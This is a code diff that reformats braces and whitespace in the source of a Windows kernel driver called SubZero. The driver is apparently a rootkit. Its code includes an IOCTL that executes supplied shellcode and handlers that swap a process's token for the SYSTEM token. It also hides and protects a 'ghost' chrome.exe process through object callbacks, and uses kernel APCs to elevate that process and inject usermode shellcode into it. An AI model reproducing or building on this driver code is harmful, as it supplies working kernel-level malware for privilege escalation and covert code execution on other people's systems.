@@ -9,16 +9,18 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
 	UNICODE_STRING altitude = RTL_CONSTANT_STRING(L"12345.6171");
 	
 	// Build registration structures for chrome Process' protection
-	OB_OPERATION_REGISTRATION operations[] = {
+	OB_OPERATION_REGISTRATION operations[] = 
+	{
 		{
 			PsProcessType,		        // object type
 			OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
 			OnPreOpenProcess, nullptr	// pre, post
 		}
 	};
-	OB_CALLBACK_REGISTRATION reg = {
+	OB_CALLBACK_REGISTRATION reg = 
+	{
 		OB_FLT_REGISTRATION_VERSION,
-		1,					// operation count
+		1,                  // operation count
 		altitude,			// altitude
 		nullptr,			// context
 		operations
@@ -33,14 +35,16 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
 	do {
 		status = ::IoCreateDevice(DriverObject, 0, &devName,
 			FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
-		if (!NT_SUCCESS(status)) {
+		if (!NT_SUCCESS(status)) 
+		{
 			KdPrint((DRIVER_PREFIX "[-] Failed to create device (status=0x%08X)\n",status));
 			break;
 		}
 		DeviceObject->Flags |= DO_DIRECT_IO;
 
 		status = ::IoCreateSymbolicLink(&symLink, &devName);
-		if (!NT_SUCCESS(status)) {
+		if (!NT_SUCCESS(status)) 
+		{
 			KdPrint((DRIVER_PREFIX "[-] Failed to create sym link (status=0x%08X)\n",status));
 			break;
 		}
@@ -48,28 +52,32 @@ DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING)
 
 		// Register for object notifications
 		status = ::ObRegisterCallbacks(&reg, &g_Globals.ObjectRegistrationHandle);
-		if (!NT_SUCCESS(status)) {
+		if (!NT_SUCCESS(status)) 
+		{
 			KdPrint((DRIVER_PREFIX "[-] Failed to register object callbacks (status=0x%08X)\n", status));
 			break;
 		}
 
 		status = ::CmRegisterCallbackEx(OnRegistryNotify, &altitude, DriverObject,
 			nullptr, &g_Globals.RegistryRegistrationCookie, nullptr);
-		if (!NT_SUCCESS(status)) {
+		if (!NT_SUCCESS(status)) 
+		{
 			KdPrint((DRIVER_PREFIX "failed to set registry callback (status=%08X)\n", status));
 			break;
 		}
 
 		// Register for Thread notifications
 		status = ::PsSetCreateThreadNotifyRoutine(OnThreadNotify);
-		if (!NT_SUCCESS(status)) {
+		if (!NT_SUCCESS(status)) 
+		{
 			KdPrint((DRIVER_PREFIX "[-] Failed to set Thread callbacks (status=%08X)\n", status));
 			break;
 		}
 		
 	} while (false);
 	
-	if (!NT_SUCCESS(status)) {
+	if (!NT_SUCCESS(status)) 
+	{
 		if (symLinkCreated)
 			::IoDeleteSymbolicLink(&symLink);
 		if (nullptr != DeviceObject)
@@ -128,7 +136,8 @@ void SubZeroUnload(PDRIVER_OBJECT DriverObject)
 	KdPrint((DRIVER_PREFIX "[+] Driver unloaded successfully\n"));
 }
 
-NTSTATUS SubZeroCreateClose(PDEVICE_OBJECT, PIRP Irp) {
+NTSTATUS SubZeroCreateClose(PDEVICE_OBJECT, PIRP Irp) 
+{
 	Irp->IoStatus.Status = STATUS_SUCCESS;
 	Irp->IoStatus.Information = 0;
 	::IoCompleteRequest(Irp, 0);
@@ -147,7 +156,8 @@ NTSTATUS SubZeroDeviceControl(PDEVICE_OBJECT, PIRP Irp)
 	if (nullptr != Irp)
 	{
 		// Run the corresponding handler for the request:
-		switch (controlCode) {
+		switch (controlCode) 
+		{
 		case IOCTL_SUBZERO_EXECUTE_SHELLCODE:
 			status = ExecuteShellcode_ControlCodeHandler(Irp, stack);
 			break;
@@ -310,9 +320,9 @@ NTSTATUS SetTokenToSystem_ControlCodeHandler(_In_ PIRP Irp, _In_ PIO_STACK_LOCAT
 		if (!NT_SUCCESS(status))
 			return status;
 		
-		auto* const token = ::PsReferencePrimaryToken(process);		// Get the process token										
-		status = SetTokenToSystem(process, token);					// Replace the process token with system token		
-		::ObDereferenceObject(token);								// Dereference the process token
+		auto* const token = ::PsReferencePrimaryToken(process); // Get the process token										
+		status = SetTokenToSystem(process, token);              // Replace the process token with system token		
+		::ObDereferenceObject(token);                           // Dereference the process token
 
 		return status;
 	}
@@ -389,7 +399,8 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
 
 		// Register for Process notifications in order to catch the ghost chrome launch
 		const auto status = ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
-		if (!NT_SUCCESS(status)) {
+		if (!NT_SUCCESS(status)) 
+		{
 			KdPrint((DRIVER_PREFIX "[-] Failed to register Process callback (status=0x%08X)\n", status));
 			return;
 		}
@@ -414,15 +425,16 @@ void OnThreadNotify(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create)
 		g_Globals.ChromeFirstThreadID = tid;
 
 		// Queue APC for dll loading
-		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) {
+		if (::ExAcquireRundownProtection(&g_Globals.RundownProtection)) 
+		{
 			::PsLookupThreadByThreadId(ThreadId, &thread);
 			
-			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)
+			if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID)		
 				{				
-					auto* const process = ::PsGetCurrentProcess();			// Get current process (i.e. chrome.exe)
-					auto* const token = ::PsReferencePrimaryToken(process);	// Get the process token
-					SetTokenToSystem(process, token);						// Replace the process token with system token
-					::ObDereferenceObject(token);							// Dereference the process token
+					auto* const process = ::PsGetCurrentProcess();          // Get current process (i.e. chrome.exe)
+					auto* const token = ::PsReferencePrimaryToken(process); // Get the process token
+					SetTokenToSystem(process, token);                       // Replace the process token with system token
+					::ObDereferenceObject(token);                           // Dereference the process token
 					
 					// Thread and Process creation notification callbacks are not needed anymore
 					::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
@@ -447,7 +459,8 @@ void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateI
 	if (g_Globals.ChromePID == 0) 
 	{
 		// Search for our ghost chrome 
-		if (::HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) {
+		if (::HandleToULong(CreateInfo->ParentProcessId) == g_Globals.ExplorerPID) 
+		{
 			KdPrint((DRIVER_PREFIX "[+] Chrome.exe catched. PID: %d\n", pid));
 			g_Globals.ChromePID = pid;
 		}
@@ -457,7 +470,8 @@ void OnProcessNotify(PEPROCESS, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateI
 NTSTATUS QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFunction) 
 {
 	auto* apc = static_cast<KAPC*>(::ExAllocatePoolWithTag(NonPagedPool, sizeof(KAPC), DRIVER_TAG));
-	if (nullptr == apc) {
+	if (nullptr == apc) 
+	{
 		KdPrint((DRIVER_PREFIX "[-] Error allocating KAPC structure\n"));
 		return STATUS_INSUFFICIENT_RESOURCES;
 	}
@@ -467,7 +481,7 @@ NTSTATUS QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFun
 		Thread,
 		OriginalApcEnvironment,
 		[](PKAPC apc, PKNORMAL_ROUTINE*, PVOID*, PVOID*, PVOID*) {::ExFreePoolWithTag(apc, DRIVER_TAG); }, // Kernel APC
-		[](const PKAPC apc)																				   // Rundown APC
+		[](const PKAPC apc)	                                                                               // Rundown APC
 		{
 			::ExFreePoolWithTag(apc, DRIVER_TAG);
 			::ExReleaseRundownProtection(&g_Globals.RundownProtection);
@@ -484,7 +498,8 @@ NTSTATUS QueueAPC(PKTHREAD Thread, KPROCESSOR_MODE Mode, PKNORMAL_ROUTINE ApcFun
 		0
 	);
 
-	if (!inserted) {
+	if (!inserted) 
+	{
 		::ExFreePoolWithTag(apc, DRIVER_TAG);
 		KdPrint((DRIVER_PREFIX "[-] Error inserting APC\n"));
 		return STATUS_INTERNAL_ERROR;
@@ -511,7 +526,8 @@ void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize)
 		MEM_RESERVE | MEM_COMMIT,
 		PAGE_EXECUTE_READ
 	);
-	if (!NT_SUCCESS(status)) {
+	if (!NT_SUCCESS(status)) 
+	{
 		KdPrint((DRIVER_PREFIX "[-] ZwAllocateVirtualMemory failed (0x%08X)\n", status));
 		::ExReleaseRundownProtection(&g_Globals.RundownProtection);
 		return;
@@ -558,10 +574,12 @@ void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize)
 
 	} while (false);
 
-	if (!successful) {
+	if (!successful) 
+	{
 		if (mdl) 
 		{
-			if (mappedAddress) {
+			if (mappedAddress) 
+			{
 				KdPrint((DRIVER_PREFIX "[-] Error protecting MDL pages\n"));
 				::MmUnmapLockedPages(mappedAddress, mdl);
 			}
